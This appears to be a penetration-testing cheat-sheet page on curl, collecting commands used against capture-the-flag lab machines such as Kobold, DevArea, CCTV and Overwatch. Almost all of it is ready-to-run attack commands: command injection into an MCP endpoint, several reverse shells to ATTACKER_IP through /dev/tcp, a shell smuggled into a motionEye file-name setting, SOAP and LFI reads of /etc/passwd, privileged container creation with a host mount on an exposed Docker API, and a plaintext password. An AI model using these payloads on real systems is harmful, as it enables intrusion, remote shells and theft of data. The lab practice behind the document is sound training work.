# curl

HTTP client used for API interaction, exploit delivery (JSON/XML payloads), SOAP injection and reverse shell triggering.

## Commands Used

### MCP API command injection (JSON body)
```bash
curl -k https://mcp.kobold.htb/api/mcp/connect -X POST \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'
```
Used on: **Kobold** — exploits unsanitized `command` / `args` in an MCP endpoint.

### Reverse shell via JSON payload
```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"],"env":{}},"serverId":"revshell"}'
```
Used on: **Kobold**

### Password reset abuse / MailHog interception
```bash
curl -X POST http://staging.silentium.htb/api/v1/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb"}'

curl http://staging.silentium.htb:8025/api/v2/messages
```
Used on: **Silentium**

### Multipart SOAP XOP Include (arbitrary file read)
```bash
curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; start-info="text/xml"; boundary="MIMEBoundary"' \
  --data-binary $'--MIMEBoundary\r\n...<xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/>...--MIMEBoundary--\r\n'
```
Used on: **DevArea**

### JWT authentication
```bash
curl -X POST http://devarea.htb:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}'
```
Used on: **DevArea**

### Authenticated RCE via Hoverfly middleware (PUT)
```bash
curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"binary":"bash","script":"#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"}'
```
Used on: **DevArea**

### Trigger Hoverfly proxy middleware execution
```bash
curl -x http://devarea.htb:8500 http://example.com
```
Used on: **DevArea**

### motionEye config injection through API
```bash
curl "http://127.0.0.1:7999/1/config/set?picture_output=on"
curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
```
Used on: **CCTV**

### Writing content through Gogs symlink via API
```bash
curl -X PUT "http://127.0.0.1:8080/api/v1/repos/123/pwn/contents/link" \
  -H "Content-Type: application/json" \
  -H "Authorization: token $TOKEN" \
  -d "{\"message\":\"write\",\"content\":\"$PUB\"}"
```
Used on: **Silentium**

### Unauthenticated Docker API abuse
```bash
curl http://DOCKER_HOST_IP:2375/version
curl http://DOCKER_HOST_IP:2375/containers/json

curl -X POST -H "Content-Type: application/json" \
  http://DOCKER_HOST_IP:2375/containers/create?name=pwned \
  -d '{"Image":"alpine:latest","Cmd":["sleep","infinity"],"HostConfig":{"Privileged":true,"Binds":["/mnt/host/c/:/mnt/windows"]}}'

curl -X POST http://DOCKER_HOST_IP:2375/containers/pwned/start
```
Used on: **MonitorsFour**

### LFI — read arbitrary files through a PHP page parameter
```bash
curl "http://dev.team.thm/script.php?page=/etc/passwd"
curl "http://dev.team.thm/script.php?page=/etc/vsftpd.conf"
curl "http://dev.team.thm/script.php?page=/etc/ssh/sshd_config"
```
Used on: **Team** — `page` parameter passes input unsanitized to `include()`.

### Codiad authentication (obtain session cookie)
```bash
curl -k -i 'http://TARGET_IP/codiad/components/user/controller.php?action=authenticate' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username=john&password=password&theme=default&language=en' \
  -c cookies.txt
```
Used on: **IDE** — first step before triggering CVE-2018-14009.

### SOAP command injection (Windows)
```bash
curl.exe -X POST http://127.0.0.1:8000/MonitorService \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" \
  -d "<soap:Envelope>...<processName>notepad;type C:\Users\Administrator\Desktop\root.txt</processName>...</soap:Envelope>"
```
Used on: **Overwatch**
